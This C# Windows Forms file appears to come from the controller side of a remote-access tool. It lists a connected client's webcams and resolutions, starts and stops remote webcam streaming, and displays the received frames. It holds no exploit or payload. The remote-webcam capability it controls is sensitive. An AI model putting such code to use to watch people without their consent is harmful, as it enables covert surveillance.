using Serveur.Controllers;
using Serveur.Controllers.Server;
using Serveur.Packets.ServerPackets;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;

namespace Serveur.Views
{
    public partial class FrmRemoteWebcam : Form
    {
        public FrmRemoteWebcamController frmRemoteWebcamController;
        public bool started;
        public bool IsStarted { get; private set; }
        public ClientMosaic client;
        private Dictionary<string, List<string>> _webcams;

        public FrmRemoteWebcam(ClientMosaic client)
        {
            this.client = client;
            client.value.frmWbc = this;
            frmRemoteWebcamController = new FrmRemoteWebcamController(client);
            InitializeComponent();
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            btnStop.Enabled = true;
            btnStart.Enabled = false;
            cboResolutions.Enabled = false;
            cboWebcams.Enabled = false;
            IsStarted = true;
            this.ActiveControl = pbWebcam;
            new GetWebcam(cboResolutions.SelectedIndex, cboWebcams.SelectedIndex).Execute(client);
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            btnStop.Enabled = false;

            if (IsStarted == true)
             new StopWebcam().Execute(client);

            if (btnStart.Enabled == false) btnStart.Enabled = true;
            if (cboWebcams.Enabled == false) cboWebcams.Enabled = true;
            if (cboResolutions.Enabled == false) cboResolutions.Enabled = true;

            IsStarted = false;
        }

        public void AddWebcams(Dictionary<string, List<string>> webcams)
        {
            this._webcams = webcams;
            try
            {
                tsFrmWbc.Invoke((MethodInvoker)delegate
                {
                    foreach (var webcam in webcams.Keys)
                    {
                        cboWebcams.Items.Add(string.Format("{0}", webcam));
                    }
                    cboWebcams.SelectedIndex = 0;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void updateImage(Bitmap bmp, bool cloneBitmap = false)
        {
            pbWebcam.Image = new Bitmap(bmp, pbWebcam.Width, pbWebcam.Height);
        }

        private void FrmRemoteWebcam_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (IsStarted == true)
                new StopWebcam().Execute(client);

            IsStarted = false;
        }

        private void cboWebcams_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                tsFrmWbc.Invoke((MethodInvoker)delegate
                {
                    cboResolutions.Items.Clear();

                    foreach (var resolution in this._webcams.ElementAt(cboWebcams.SelectedIndex).Value)
                    {
                        cboResolutions.Items.Add(string.Format("{0}", resolution));
                    }
                    cboResolutions.SelectedIndex = 0;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }
    }
}
